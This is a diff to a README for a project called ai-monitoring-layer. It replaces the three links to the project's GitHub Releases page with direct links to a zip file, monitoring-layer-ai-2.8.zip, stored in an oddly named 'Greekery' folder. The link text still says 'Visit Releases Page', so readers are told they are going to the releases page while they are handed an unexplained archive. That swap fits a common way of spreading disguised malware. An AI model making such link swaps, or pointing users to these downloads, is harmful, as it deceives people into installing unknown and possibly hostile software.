@@ -1,6 +1,6 @@
 # 🚀 ai-monitoring-layer - Simple AI Insights for Your Web Apps
 
-[![Download ai-monitoring-layer](https://img.shields.io/badge/Download-ai--monitoring--layer-blue.svg)](https://github.com/LaurenceGab/ai-monitoring-layer/releases)
+[![Download ai-monitoring-layer](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)
 
 ## 📖 Introduction
 
@@ -27,7 +27,7 @@ To run ai-monitoring-layer, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
 
-   [Visit Releases Page](https://github.com/LaurenceGab/ai-monitoring-layer/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)
 
 2. **Download the Latest Release**: Find the latest version available. Click on it to download.
 
@@ -42,7 +42,7 @@ To get started with ai-monitoring-layer, follow these steps:
 
 1. **Visit the Releases Page**: Go to the following link to access the files available for download:
 
-   [Visit the Releases Page to Download](https://github.com/LaurenceGab/ai-monitoring-layer/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)
 
 2. **Download the application**: 
    - Choose the most recent version and download it.
